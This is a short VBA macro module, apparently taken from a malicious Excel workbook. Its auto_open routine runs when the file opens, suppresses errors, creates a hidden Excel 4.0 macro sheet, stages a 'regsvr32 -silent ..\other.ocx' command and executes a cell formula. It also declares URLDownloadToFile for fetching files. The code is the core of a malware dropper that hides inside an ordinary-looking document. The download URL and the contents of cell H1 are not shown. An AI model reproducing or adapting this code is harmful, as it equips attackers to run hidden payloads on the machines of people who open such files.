Attribute VB_Name = "Module5"
Declare Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
Sub auto_open()
On Error Resume Next
Excel4IntlMacroSheets.Add.Name = "Data"
Sheets("Data").Visible = False
Sheets("Data").Range("Q6") = "regsvr32 -silent ..\other.ocx"
Application.Run Sheets("Data").Range("H1")
End Sub
